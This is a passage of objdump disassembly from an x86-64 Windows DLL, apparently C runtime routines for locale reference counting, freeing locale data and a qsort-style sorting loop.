   18000afc2:	48 8d 05 9f 0c 01 00 	lea    0x10c9f(%rip),%rax        # 0x18001bc68
   18000afc9:	48 3b d8             	cmp    %rax,%rbx
   18000afcc:	74 19                	je     0x18000afe7
   18000afce:	48 39 33             	cmp    %rsi,(%rbx)
   18000afd1:	74 0e                	je     0x18000afe1
   18000afd3:	48 8b d6             	mov    %rsi,%rdx
   18000afd6:	48 8b cb             	mov    %rbx,%rcx
   18000afd9:	e8 32 04 00 00       	call   0x18000b410
   18000afde:	48 89 03             	mov    %rax,(%rbx)
   18000afe1:	48 83 c3 08          	add    $0x8,%rbx
   18000afe5:	eb d6                	jmp    0x18000afbd
   18000afe7:	8b 0f                	mov    (%rdi),%ecx
   18000afe9:	e8 fe d0 ff ff       	call   0x1800080ec
   18000afee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000aff3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000aff8:	48 83 c4 30          	add    $0x30,%rsp
   18000affc:	5f                   	pop    %rdi
   18000affd:	c3                   	ret
   18000affe:	cc                   	int3
   18000afff:	cc                   	int3
   18000b000:	b8 01 00 00 00       	mov    $0x1,%eax
   18000b005:	87 05 85 0c 01 00    	xchg   %eax,0x10c85(%rip)        # 0x18001bc90
   18000b00b:	c3                   	ret
   18000b00c:	4c 8b dc             	mov    %rsp,%r11
   18000b00f:	48 83 ec 28          	sub    $0x28,%rsp
   18000b013:	b8 04 00 00 00       	mov    $0x4,%eax
   18000b018:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   18000b01c:	4d 8d 43 08          	lea    0x8(%r11),%r8
   18000b020:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000b024:	49 8d 53 18          	lea    0x18(%r11),%rdx
   18000b028:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000b02c:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   18000b030:	e8 5b ff ff ff       	call   0x18000af90
   18000b035:	48 83 c4 28          	add    $0x28,%rsp
   18000b039:	c3                   	ret
   18000b03a:	cc                   	int3
   18000b03b:	cc                   	int3
   18000b03c:	48 83 ec 28          	sub    $0x28,%rsp
   18000b040:	e8 63 cd ff ff       	call   0x180007da8
   18000b045:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000b04a:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   18000b051:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000b056:	48 8b c8             	mov    %rax,%rcx
   18000b059:	e8 a2 fe ff ff       	call   0x18000af00
   18000b05e:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000b063:	48 8b 00             	mov    (%rax),%rax
   18000b066:	48 83 c4 28          	add    $0x28,%rsp
   18000b06a:	c3                   	ret
   18000b06b:	cc                   	int3
   18000b06c:	f0 ff 41 10          	lock incl 0x10(%rcx)
   18000b070:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   18000b077:	48 85 c0             	test   %rax,%rax
   18000b07a:	74 03                	je     0x18000b07f
   18000b07c:	f0 ff 00             	lock incl (%rax)
   18000b07f:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   18000b086:	48 85 c0             	test   %rax,%rax
   18000b089:	74 03                	je     0x18000b08e
   18000b08b:	f0 ff 00             	lock incl (%rax)
   18000b08e:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   18000b095:	48 85 c0             	test   %rax,%rax
   18000b098:	74 03                	je     0x18000b09d
   18000b09a:	f0 ff 00             	lock incl (%rax)
   18000b09d:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   18000b0a4:	48 85 c0             	test   %rax,%rax
   18000b0a7:	74 03                	je     0x18000b0ac
   18000b0a9:	f0 ff 00             	lock incl (%rax)
   18000b0ac:	48 8d 41 38          	lea    0x38(%rcx),%rax
   18000b0b0:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   18000b0b6:	48 8d 15 4b f6 00 00 	lea    0xf64b(%rip),%rdx        # 0x18001a708
   18000b0bd:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   18000b0c1:	74 0b                	je     0x18000b0ce
   18000b0c3:	48 8b 10             	mov    (%rax),%rdx
   18000b0c6:	48 85 d2             	test   %rdx,%rdx
   18000b0c9:	74 03                	je     0x18000b0ce
   18000b0cb:	f0 ff 02             	lock incl (%rdx)
   18000b0ce:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   18000b0d3:	74 0c                	je     0x18000b0e1
   18000b0d5:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   18000b0d9:	48 85 d2             	test   %rdx,%rdx
   18000b0dc:	74 03                	je     0x18000b0e1
   18000b0de:	f0 ff 02             	lock incl (%rdx)
   18000b0e1:	48 83 c0 20          	add    $0x20,%rax
   18000b0e5:	49 83 e8 01          	sub    $0x1,%r8
   18000b0e9:	75 cb                	jne    0x18000b0b6
   18000b0eb:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   18000b0f2:	e9 79 01 00 00       	jmp    0x18000b270
   18000b0f7:	cc                   	int3
   18000b0f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b0fd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000b102:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000b107:	57                   	push   %rdi
   18000b108:	48 83 ec 20          	sub    $0x20,%rsp
   18000b10c:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   18000b113:	48 8b d9             	mov    %rcx,%rbx
   18000b116:	48 85 c0             	test   %rax,%rax
   18000b119:	74 79                	je     0x18000b194
   18000b11b:	48 8d 0d fe f6 00 00 	lea    0xf6fe(%rip),%rcx        # 0x18001a820
   18000b122:	48 3b c1             	cmp    %rcx,%rax
   18000b125:	74 6d                	je     0x18000b194
   18000b127:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   18000b12e:	48 85 c0             	test   %rax,%rax
   18000b131:	74 61                	je     0x18000b194
   18000b133:	83 38 00             	cmpl   $0x0,(%rax)
   18000b136:	75 5c                	jne    0x18000b194
   18000b138:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   18000b13f:	48 85 c9             	test   %rcx,%rcx
   18000b142:	74 16                	je     0x18000b15a
   18000b144:	83 39 00             	cmpl   $0x0,(%rcx)
   18000b147:	75 11                	jne    0x18000b15a
   18000b149:	e8 46 d1 ff ff       	call   0x180008294
   18000b14e:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000b155:	e8 4e 27 00 00       	call   0x18000d8a8
   18000b15a:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   18000b161:	48 85 c9             	test   %rcx,%rcx
   18000b164:	74 16                	je     0x18000b17c
   18000b166:	83 39 00             	cmpl   $0x0,(%rcx)
   18000b169:	75 11                	jne    0x18000b17c
   18000b16b:	e8 24 d1 ff ff       	call   0x180008294
   18000b170:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000b177:	e8 38 28 00 00       	call   0x18000d9b4
   18000b17c:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   18000b183:	e8 0c d1 ff ff       	call   0x180008294
   18000b188:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000b18f:	e8 00 d1 ff ff       	call   0x180008294
   18000b194:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   18000b19b:	48 85 c0             	test   %rax,%rax
   18000b19e:	74 47                	je     0x18000b1e7
   18000b1a0:	83 38 00             	cmpl   $0x0,(%rax)
   18000b1a3:	75 42                	jne    0x18000b1e7
   18000b1a5:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   18000b1ac:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   18000b1b3:	e8 dc d0 ff ff       	call   0x180008294
   18000b1b8:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   18000b1bf:	bf 80 00 00 00       	mov    $0x80,%edi
   18000b1c4:	48 2b cf             	sub    %rdi,%rcx
   18000b1c7:	e8 c8 d0 ff ff       	call   0x180008294
   18000b1cc:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   18000b1d3:	48 2b cf             	sub    %rdi,%rcx
   18000b1d6:	e8 b9 d0 ff ff       	call   0x180008294
   18000b1db:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   18000b1e2:	e8 ad d0 ff ff       	call   0x180008294
   18000b1e7:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   18000b1ee:	e8 a5 00 00 00       	call   0x18000b298
   18000b1f3:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   18000b1fa:	bd 06 00 00 00       	mov    $0x6,%ebp
   18000b1ff:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   18000b203:	48 8d 05 fe f4 00 00 	lea    0xf4fe(%rip),%rax        # 0x18001a708
   18000b20a:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   18000b20e:	74 1a                	je     0x18000b22a
   18000b210:	48 8b 0f             	mov    (%rdi),%rcx
   18000b213:	48 85 c9             	test   %rcx,%rcx
   18000b216:	74 12                	je     0x18000b22a
   18000b218:	83 39 00             	cmpl   $0x0,(%rcx)
   18000b21b:	75 0d                	jne    0x18000b22a
   18000b21d:	e8 72 d0 ff ff       	call   0x180008294
   18000b222:	48 8b 0e             	mov    (%rsi),%rcx
   18000b225:	e8 6a d0 ff ff       	call   0x180008294
   18000b22a:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   18000b22f:	74 13                	je     0x18000b244
   18000b231:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   18000b235:	48 85 c9             	test   %rcx,%rcx
   18000b238:	74 0a                	je     0x18000b244
   18000b23a:	83 39 00             	cmpl   $0x0,(%rcx)
   18000b23d:	75 05                	jne    0x18000b244
   18000b23f:	e8 50 d0 ff ff       	call   0x180008294
   18000b244:	48 83 c6 08          	add    $0x8,%rsi
   18000b248:	48 83 c7 20          	add    $0x20,%rdi
   18000b24c:	48 83 ed 01          	sub    $0x1,%rbp
   18000b250:	75 b1                	jne    0x18000b203
   18000b252:	48 8b cb             	mov    %rbx,%rcx
   18000b255:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b25a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000b25f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000b264:	48 83 c4 20          	add    $0x20,%rsp
   18000b268:	5f                   	pop    %rdi
   18000b269:	e9 26 d0 ff ff       	jmp    0x180008294
   18000b26e:	cc                   	int3
   18000b26f:	cc                   	int3
   18000b270:	48 85 c9             	test   %rcx,%rcx
   18000b273:	74 1c                	je     0x18000b291
   18000b275:	48 8d 05 b4 6a 00 00 	lea    0x6ab4(%rip),%rax        # 0x180011d30
   18000b27c:	48 3b c8             	cmp    %rax,%rcx
   18000b27f:	74 10                	je     0x18000b291
   18000b281:	b8 01 00 00 00       	mov    $0x1,%eax
   18000b286:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   18000b28d:	00 
   18000b28e:	ff c0                	inc    %eax
   18000b290:	c3                   	ret
   18000b291:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   18000b296:	c3                   	ret
   18000b297:	cc                   	int3
   18000b298:	48 85 c9             	test   %rcx,%rcx
   18000b29b:	74 30                	je     0x18000b2cd
   18000b29d:	53                   	push   %rbx
   18000b29e:	48 83 ec 20          	sub    $0x20,%rsp
   18000b2a2:	48 8d 05 87 6a 00 00 	lea    0x6a87(%rip),%rax        # 0x180011d30
   18000b2a9:	48 8b d9             	mov    %rcx,%rbx
   18000b2ac:	48 3b c8             	cmp    %rax,%rcx
   18000b2af:	74 17                	je     0x18000b2c8
   18000b2b1:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   18000b2b7:	85 c0                	test   %eax,%eax
   18000b2b9:	75 0d                	jne    0x18000b2c8
   18000b2bb:	e8 b8 27 00 00       	call   0x18000da78
   18000b2c0:	48 8b cb             	mov    %rbx,%rcx
   18000b2c3:	e8 cc cf ff ff       	call   0x180008294
   18000b2c8:	48 83 c4 20          	add    $0x20,%rsp
   18000b2cc:	5b                   	pop    %rbx
   18000b2cd:	c3                   	ret
   18000b2ce:	cc                   	int3
   18000b2cf:	cc                   	int3
   18000b2d0:	48 85 c9             	test   %rcx,%rcx
   18000b2d3:	74 1a                	je     0x18000b2ef
   18000b2d5:	48 8d 05 54 6a 00 00 	lea    0x6a54(%rip),%rax        # 0x180011d30
   18000b2dc:	48 3b c8             	cmp    %rax,%rcx
   18000b2df:	74 0e                	je     0x18000b2ef
   18000b2e1:	83 c8 ff             	or     $0xffffffff,%eax
   18000b2e4:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   18000b2eb:	00 
   18000b2ec:	ff c8                	dec    %eax
   18000b2ee:	c3                   	ret
   18000b2ef:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   18000b2f4:	c3                   	ret
   18000b2f5:	cc                   	int3
   18000b2f6:	cc                   	int3
   18000b2f7:	cc                   	int3
   18000b2f8:	48 83 ec 28          	sub    $0x28,%rsp
   18000b2fc:	48 85 c9             	test   %rcx,%rcx
   18000b2ff:	0f 84 96 00 00 00    	je     0x18000b39b
   18000b305:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000b309:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   18000b30e:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   18000b315:	48 85 c0             	test   %rax,%rax
   18000b318:	74 04                	je     0x18000b31e
   18000b31a:	f0 44 01 08          	lock add %r9d,(%rax)
   18000b31e:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   18000b325:	48 85 c0             	test   %rax,%rax
   18000b328:	74 04                	je     0x18000b32e
   18000b32a:	f0 44 01 08          	lock add %r9d,(%rax)
   18000b32e:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   18000b335:	48 85 c0             	test   %rax,%rax
   18000b338:	74 04                	je     0x18000b33e
   18000b33a:	f0 44 01 08          	lock add %r9d,(%rax)
   18000b33e:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   18000b345:	48 85 c0             	test   %rax,%rax
   18000b348:	74 04                	je     0x18000b34e
   18000b34a:	f0 44 01 08          	lock add %r9d,(%rax)
   18000b34e:	48 8d 41 38          	lea    0x38(%rcx),%rax
   18000b352:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   18000b358:	48 8d 15 a9 f3 00 00 	lea    0xf3a9(%rip),%rdx        # 0x18001a708
   18000b35f:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   18000b363:	74 0c                	je     0x18000b371
   18000b365:	48 8b 10             	mov    (%rax),%rdx
   18000b368:	48 85 d2             	test   %rdx,%rdx
   18000b36b:	74 04                	je     0x18000b371
   18000b36d:	f0 44 01 0a          	lock add %r9d,(%rdx)
   18000b371:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   18000b376:	74 0d                	je     0x18000b385
   18000b378:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   18000b37c:	48 85 d2             	test   %rdx,%rdx
   18000b37f:	74 04                	je     0x18000b385
   18000b381:	f0 44 01 0a          	lock add %r9d,(%rdx)
   18000b385:	48 83 c0 20          	add    $0x20,%rax
   18000b389:	49 83 e8 01          	sub    $0x1,%r8
   18000b38d:	75 c9                	jne    0x18000b358
   18000b38f:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   18000b396:	e8 35 ff ff ff       	call   0x18000b2d0
   18000b39b:	48 83 c4 28          	add    $0x28,%rsp
   18000b39f:	c3                   	ret
   18000b3a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b3a5:	57                   	push   %rdi
   18000b3a6:	48 83 ec 20          	sub    $0x20,%rsp
   18000b3aa:	e8 f9 c9 ff ff       	call   0x180007da8
   18000b3af:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   18000b3b6:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   18000b3bc:	8b 05 56 f4 00 00    	mov    0xf456(%rip),%eax        # 0x18001a818
   18000b3c2:	85 c8                	test   %ecx,%eax
   18000b3c4:	74 08                	je     0x18000b3ce
   18000b3c6:	48 8b 1f             	mov    (%rdi),%rbx
   18000b3c9:	48 85 db             	test   %rbx,%rbx
   18000b3cc:	75 2c                	jne    0x18000b3fa
   18000b3ce:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000b3d3:	e8 c0 cc ff ff       	call   0x180008098
   18000b3d8:	90                   	nop
   18000b3d9:	48 8b 15 80 08 01 00 	mov    0x10880(%rip),%rdx        # 0x18001bc60
   18000b3e0:	48 8b cf             	mov    %rdi,%rcx
   18000b3e3:	e8 28 00 00 00       	call   0x18000b410
   18000b3e8:	48 8b d8             	mov    %rax,%rbx
   18000b3eb:	b9 04 00 00 00       	mov    $0x4,%ecx
   18000b3f0:	e8 f7 cc ff ff       	call   0x1800080ec
   18000b3f5:	48 85 db             	test   %rbx,%rbx
   18000b3f8:	74 0e                	je     0x18000b408
   18000b3fa:	48 8b c3             	mov    %rbx,%rax
   18000b3fd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b402:	48 83 c4 20          	add    $0x20,%rsp
   18000b406:	5f                   	pop    %rdi
   18000b407:	c3                   	ret
   18000b408:	e8 c7 c3 ff ff       	call   0x1800077d4
   18000b40d:	90                   	nop
   18000b40e:	cc                   	int3
   18000b40f:	cc                   	int3
   18000b410:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b415:	57                   	push   %rdi
   18000b416:	48 83 ec 20          	sub    $0x20,%rsp
   18000b41a:	48 8b fa             	mov    %rdx,%rdi
   18000b41d:	48 85 d2             	test   %rdx,%rdx
   18000b420:	74 46                	je     0x18000b468
   18000b422:	48 85 c9             	test   %rcx,%rcx
   18000b425:	74 41                	je     0x18000b468
   18000b427:	48 8b 19             	mov    (%rcx),%rbx
   18000b42a:	48 3b da             	cmp    %rdx,%rbx
   18000b42d:	75 05                	jne    0x18000b434
   18000b42f:	48 8b c7             	mov    %rdi,%rax
   18000b432:	eb 36                	jmp    0x18000b46a
   18000b434:	48 89 39             	mov    %rdi,(%rcx)
   18000b437:	48 8b cf             	mov    %rdi,%rcx
   18000b43a:	e8 2d fc ff ff       	call   0x18000b06c
   18000b43f:	48 85 db             	test   %rbx,%rbx
   18000b442:	74 eb                	je     0x18000b42f
   18000b444:	48 8b cb             	mov    %rbx,%rcx
   18000b447:	e8 ac fe ff ff       	call   0x18000b2f8
   18000b44c:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   18000b450:	75 dd                	jne    0x18000b42f
   18000b452:	48 8d 05 47 f1 00 00 	lea    0xf147(%rip),%rax        # 0x18001a5a0
   18000b459:	48 3b d8             	cmp    %rax,%rbx
   18000b45c:	74 d1                	je     0x18000b42f
   18000b45e:	48 8b cb             	mov    %rbx,%rcx
   18000b461:	e8 92 fc ff ff       	call   0x18000b0f8
   18000b466:	eb c7                	jmp    0x18000b42f
   18000b468:	33 c0                	xor    %eax,%eax
   18000b46a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b46f:	48 83 c4 20          	add    $0x20,%rsp
   18000b473:	5f                   	pop    %rdi
   18000b474:	c3                   	ret
   18000b475:	cc                   	int3
   18000b476:	cc                   	int3
   18000b477:	cc                   	int3
   18000b478:	8b 05 16 08 01 00    	mov    0x10816(%rip),%eax        # 0x18001bc94
   18000b47e:	c3                   	ret
   18000b47f:	cc                   	int3
   18000b480:	41 54                	push   %r12
   18000b482:	41 55                	push   %r13
   18000b484:	41 56                	push   %r14
   18000b486:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   18000b48d:	48 8b 05 7c eb 00 00 	mov    0xeb7c(%rip),%rax        # 0x18001a010
   18000b494:	48 33 c4             	xor    %rsp,%rax
   18000b497:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   18000b49e:	00 
   18000b49f:	4d 8b e1             	mov    %r9,%r12
   18000b4a2:	4d 8b f0             	mov    %r8,%r14
   18000b4a5:	4c 8b e9             	mov    %rcx,%r13
   18000b4a8:	48 85 c9             	test   %rcx,%rcx
   18000b4ab:	75 1a                	jne    0x18000b4c7
   18000b4ad:	48 85 d2             	test   %rdx,%rdx
   18000b4b0:	74 15                	je     0x18000b4c7
   18000b4b2:	e8 45 cd ff ff       	call   0x1800081fc
   18000b4b7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000b4bd:	e8 7a b1 ff ff       	call   0x18000663c
   18000b4c2:	e9 38 03 00 00       	jmp    0x18000b7ff
   18000b4c7:	4d 85 f6             	test   %r14,%r14
   18000b4ca:	74 e6                	je     0x18000b4b2
   18000b4cc:	4d 85 e4             	test   %r12,%r12
   18000b4cf:	74 e1                	je     0x18000b4b2
   18000b4d1:	48 83 fa 02          	cmp    $0x2,%rdx
   18000b4d5:	0f 82 24 03 00 00    	jb     0x18000b7ff
   18000b4db:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   18000b4e2:	00 
   18000b4e3:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   18000b4ea:	00 
   18000b4eb:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   18000b4f2:	00 
   18000b4f3:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   18000b4fa:	00 
   18000b4fb:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   18000b502:	00 
   18000b503:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   18000b507:	4d 0f af fe          	imul   %r14,%r15
   18000b50b:	4c 03 f9             	add    %rcx,%r15
   18000b50e:	33 c9                	xor    %ecx,%ecx
   18000b510:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000b515:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000b51c:	00 00 00 00 
   18000b520:	33 d2                	xor    %edx,%edx
   18000b522:	49 8b c7             	mov    %r15,%rax
   18000b525:	49 2b c5             	sub    %r13,%rax
   18000b528:	49 f7 f6             	div    %r14
   18000b52b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   18000b52f:	48 83 fb 08          	cmp    $0x8,%rbx
   18000b533:	0f 87 8b 00 00 00    	ja     0x18000b5c4
   18000b539:	4d 3b fd             	cmp    %r13,%r15
   18000b53c:	76 65                	jbe    0x18000b5a3
   18000b53e:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   18000b542:	49 8b dd             	mov    %r13,%rbx
   18000b545:	48 8b fe             	mov    %rsi,%rdi
   18000b548:	49 3b f7             	cmp    %r15,%rsi
   18000b54b:	77 20                	ja     0x18000b56d
   18000b54d:	0f 1f 00             	nopl   (%rax)
   18000b550:	48 8b d3             	mov    %rbx,%rdx
   18000b553:	48 8b cf             	mov    %rdi,%rcx
   18000b556:	49 8b c4             	mov    %r12,%rax
   18000b559:	ff 15 09 4d 00 00    	call   *0x4d09(%rip)        # 0x180010268
   18000b55f:	85 c0                	test   %eax,%eax
   18000b561:	48 0f 4f df          	cmovg  %rdi,%rbx
   18000b565:	49 03 fe             	add    %r14,%rdi
   18000b568:	49 3b ff             	cmp    %r15,%rdi
   18000b56b:	76 e3                	jbe    0x18000b550
   18000b56d:	4d 8b c6             	mov    %r14,%r8
   18000b570:	49 8b d7             	mov    %r15,%rdx
   18000b573:	49 3b df             	cmp    %r15,%rbx
   18000b576:	74 1e                	je     0x18000b596
   18000b578:	49 2b df             	sub    %r15,%rbx
   18000b57b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000b580:	0f b6 02             	movzbl (%rdx),%eax
   18000b583:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   18000b587:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   18000b58a:	88 0a                	mov    %cl,(%rdx)
   18000b58c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000b590:	49 83 e8 01          	sub    $0x1,%r8
   18000b594:	75 ea                	jne    0x18000b580
   18000b596:	4d 2b fe             	sub    %r14,%r15
   18000b599:	4d 3b fd             	cmp    %r13,%r15
   18000b59c:	77 a4                	ja     0x18000b542
   18000b59e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000b5a3:	48 83 e9 01          	sub    $0x1,%rcx
   18000b5a7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000b5ac:	0f 88 25 02 00 00    	js     0x18000b7d7
   18000b5b2:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   18000b5b7:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   18000b5be:	00 
   18000b5bf:	e9 5c ff ff ff       	jmp    0x18000b520
   18000b5c4:	48 d1 eb             	shr    $1,%rbx
   18000b5c7:	49 8b cd             	mov    %r13,%rcx
   18000b5ca:	49 0f af de          	imul   %r14,%rbx
   18000b5ce:	49 8b c4             	mov    %r12,%rax
   18000b5d1:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   18000b5d5:	48 8b d6             	mov    %rsi,%rdx
   18000b5d8:	ff 15 8a 4c 00 00    	call   *0x4c8a(%rip)        # 0x180010268
   18000b5de:	85 c0                	test   %eax,%eax
   18000b5e0:	7e 29                	jle    0x18000b60b
   18000b5e2:	4d 8b ce             	mov    %r14,%r9
   18000b5e5:	4c 8b c6             	mov    %rsi,%r8
   18000b5e8:	4c 3b ee             	cmp    %rsi,%r13
   18000b5eb:	74 1e                	je     0x18000b60b
   18000b5ed:	0f 1f 00             	nopl   (%rax)
   18000b5f0:	41 0f b6 00          	movzbl (%r8),%eax
   18000b5f4:	49 8b d0             	mov    %r8,%rdx
   18000b5f7:	48 2b d3             	sub    %rbx,%rdx
   18000b5fa:	0f b6 0a             	movzbl (%rdx),%ecx
   18000b5fd:	88 02                	mov    %al,(%rdx)
   18000b5ff:	41 88 08             	mov    %cl,(%r8)
   18000b602:	49 ff c0             	inc    %r8
   18000b605:	49 83 e9 01          	sub    $0x1,%r9
   18000b609:	75 e5                	jne    0x18000b5f0
   18000b60b:	49 8b d7             	mov    %r15,%rdx
   18000b60e:	49 8b cd             	mov    %r13,%rcx
   18000b611:	49 8b c4             	mov    %r12,%rax
   18000b614:	ff 15 4e 4c 00 00    	call   *0x4c4e(%rip)        # 0x180010268
   18000b61a:	85 c0                	test   %eax,%eax
   18000b61c:	7e 2a                	jle    0x18000b648
   18000b61e:	4d 8b c6             	mov    %r14,%r8
   18000b621:	49 8b d7             	mov    %r15,%rdx
   18000b624:	4d 3b ef             	cmp    %r15,%r13
   18000b627:	74 1f                	je     0x18000b648
   18000b629:	4d 8b cd             	mov    %r13,%r9
   18000b62c:	4d 2b cf             	sub    %r15,%r9
   18000b62f:	90                   	nop
   18000b630:	0f b6 02             	movzbl (%rdx),%eax
   18000b633:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000b638:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000b63c:	88 0a                	mov    %cl,(%rdx)
   18000b63e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000b642:	49 83 e8 01          	sub    $0x1,%r8
   18000b646:	75 e8                	jne    0x18000b630
   18000b648:	49 8b d7             	mov    %r15,%rdx
   18000b64b:	48 8b ce             	mov    %rsi,%rcx
   18000b64e:	49 8b c4             	mov    %r12,%rax
   18000b651:	ff 15 11 4c 00 00    	call   *0x4c11(%rip)        # 0x180010268
   18000b657:	85 c0                	test   %eax,%eax
   18000b659:	7e 2d                	jle    0x18000b688
   18000b65b:	4d 8b c6             	mov    %r14,%r8
   18000b65e:	49 8b d7             	mov    %r15,%rdx
   18000b661:	49 3b f7             	cmp    %r15,%rsi
   18000b664:	74 22                	je     0x18000b688
   18000b666:	4c 8b ce             	mov    %rsi,%r9
   18000b669:	4d 2b cf             	sub    %r15,%r9
   18000b66c:	0f 1f 40 00          	nopl   0x0(%rax)
   18000b670:	0f b6 02             	movzbl (%rdx),%eax
   18000b673:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000b678:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000b67c:	88 0a                	mov    %cl,(%rdx)
   18000b67e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000b682:	49 83 e8 01          	sub    $0x1,%r8
   18000b686:	75 e8                	jne    0x18000b670
   18000b688:	49 8b dd             	mov    %r13,%rbx
   18000b68b:	49 8b ff             	mov    %r15,%rdi
   18000b68e:	66 90                	xchg   %ax,%ax
   18000b690:	48 3b f3             	cmp    %rbx,%rsi
   18000b693:	76 1d                	jbe    0x18000b6b2
   18000b695:	49 03 de             	add    %r14,%rbx
   18000b698:	48 3b de             	cmp    %rsi,%rbx
   18000b69b:	73 15                	jae    0x18000b6b2
   18000b69d:	48 8b d6             	mov    %rsi,%rdx
   18000b6a0:	48 8b cb             	mov    %rbx,%rcx
   18000b6a3:	49 8b c4             	mov    %r12,%rax
   18000b6a6:	ff 15 bc 4b 00 00    	call   *0x4bbc(%rip)        # 0x180010268
   18000b6ac:	85 c0                	test   %eax,%eax
   18000b6ae:	7e e5                	jle    0x18000b695
   18000b6b0:	eb 1e                	jmp    0x18000b6d0
   18000b6b2:	49 03 de             	add    %r14,%rbx
   18000b6b5:	49 3b df             	cmp    %r15,%rbx
